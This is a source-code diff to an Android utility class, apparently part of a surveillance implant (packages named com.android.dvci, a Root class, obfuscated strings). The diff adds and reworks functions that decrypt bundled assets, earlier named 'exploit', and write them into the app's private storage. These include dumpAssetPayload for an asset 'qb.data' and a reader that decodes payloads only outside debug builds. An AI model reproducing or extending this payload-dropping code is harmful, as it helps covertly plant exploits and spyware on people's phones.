@@ -13,6 +13,7 @@ import android.content.res.AssetManager;
 import com.android.dvci.Root;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
+import com.android.dvci.crypto.Keys;
 import com.android.dvci.file.AutoFile;
 import com.android.mm.M;
 
@@ -182,11 +183,60 @@ public final class Utils {
 		out.close();
 	}
 
-	private static boolean streamDecodeWrite(final String exploit, InputStream stream, String passphrase) {
+	private static boolean streamDecodeWriteSimple(String filename, InputStream stream) {
 		try {
-			InputStream in = Root.decodeEnc(stream, passphrase);
+			InputStream in = Root.decodeEncSimple(stream);
+			return streamDecodeWriteInternal(filename, in);
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
 
-			final FileOutputStream out = Status.getAppContext().openFileOutput(exploit, Context.MODE_PRIVATE);
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (streamDecodeWriteSimple): " + ex);
+			}
+
+			return false;
+		}
+	}
+
+	private static String streamDecodeSimple(InputStream stream) {
+		try {
+			InputStream in = Root.decodeEncSimple(stream);
+			return StringUtils.inputStreamToString(in);
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (streamDecodeWriteSimple): " + ex);
+			}
+
+			return "";
+		}
+	}
+
+	private static boolean streamDecodeWriteAnt(final String filename, String asset, InputStream stream) {
+		try{
+			InputStream in = Root.decodeEnc(stream, Cfg.RNDDB + asset.charAt(0));
+			return streamDecodeWriteInternal(filename, in);
+		} catch (Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (streamDecodeWriteAnt): " + ex);
+			}
+
+			return false;
+		}
+	}
+
+	private static boolean streamDecodeWriteInternal(final String asset, InputStream in){
+		try {
+			final FileOutputStream out = Status.getAppContext().openFileOutput(asset, Context.MODE_PRIVATE);
 			byte[] buf = new byte[1024];
 			int numRead = 0;
 
@@ -199,7 +249,7 @@ public final class Utils {
 			String pack = Status.self().getAppContext().getPackageName();
 			final String installPath = String.format(M.e("/data/data/%s/files"), pack);
 
-			AutoFile file = new AutoFile(installPath, exploit);
+			AutoFile file = new AutoFile(installPath, asset);
 			if (!file.exists() || !file.canRead()) {
 				return false;
 			}
@@ -229,8 +279,54 @@ public final class Utils {
 			}
 			return false;
 		}
-		return streamDecodeWrite(filename, stream, Cfg.RNDDB + asset.charAt(0));
+		return streamDecodeWriteAnt(filename, asset, stream);
 	}
+
+	public static boolean dumpAssetPayload(String filename) {
+
+		String asset = M.e("qb.data");
+
+		if (Cfg.DEBUG) {
+			Check.log(" (dumpAssetPayload)");
+		}
+		InputStream stream = getAssetStream(asset);
+		if(stream == null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpAssetPayload), ERROR cannot find resource: %s", asset);
+			}
+			return false;
+		}
+		return streamDecodeWriteSimple(filename, stream);
+	}
+
+	public static String readAssetPayload(String asset) {
+
+		if (Cfg.DEBUG) {
+			Check.log(" (readAssetPayload)");
+		}
+		InputStream stream = getAssetStream(asset);
+		if(stream == null){
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (dumpAssetPayload), ERROR cannot find resource: %s", asset);
+			}
+			return "";
+		}
+
+		String ret = null;
+		if(Cfg.DEBUG){
+			try {
+				ret =  StringUtils.inputStreamToString(stream);
+
+			} catch (IOException e) {
+				//
+			}
+		}else{
+			ret = streamDecodeSimple(stream);
+		}
+		return ret;
+	}
+
+
 
 	/**
 	 * checks if a pid is running,
